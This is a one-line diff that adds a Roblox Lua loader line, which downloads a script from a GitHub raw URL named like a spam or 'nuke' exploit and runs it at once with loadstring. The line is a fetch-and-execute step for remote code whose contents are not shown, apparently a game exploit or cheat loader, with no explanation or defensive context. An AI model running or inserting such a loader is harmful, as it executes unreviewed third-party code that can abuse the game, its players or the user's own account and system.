@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/nuke-a-country-spam1-02um1r4egu3liv.lua"))()
